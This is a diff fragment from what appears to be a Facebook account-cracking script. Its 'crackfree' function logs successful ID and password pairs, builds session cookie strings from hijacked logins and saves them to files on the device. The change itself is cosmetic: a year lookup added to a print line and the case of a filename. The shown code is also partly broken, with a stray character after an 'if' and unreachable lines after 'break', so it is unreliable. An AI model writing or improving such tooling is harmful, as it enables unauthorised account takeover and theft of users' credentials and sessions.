@@ -780,14 +780,14 @@ def crackfree(idf,pwv):
                 ok+=1
                 coki=po.cookies.get_dict()
                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-                print(f'\r\033[10;92m[{time.strftime("%H:%M")}•Tutul-Ok] {idf} • {pw} ')
+                print(f'\r\033[10;92m[{time.strftime("%H:%M")}•Tutul-Ok] {idf} • {pw} • {tahunng(fx)}')
                 os.system('espeak -a 300 " Ok,  Tutul,  id"')
                 open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                 break
                 if 'access_token' in q:j
                 ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);Tutulb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={Tutulb};{ckkk}"
                 print(f'\r\r\033[38;5;46m[COOKIE]\033[38;5;46m {cookie}')
-                open('/sdcard/SK-TUTUL-FILE-OK.txt','a').write(uid+'|'+pas+'|'+cookie+'\n')
+                open('/sdcard/SK-TUTUL-FILE-oK.txt','a').write(uid+'|'+pas+'|'+cookie+'\n')
                 ok.append(uid)
                 break
                 print(f"\r\r{M}[Tutul-CP] {uid} | {pas} ")
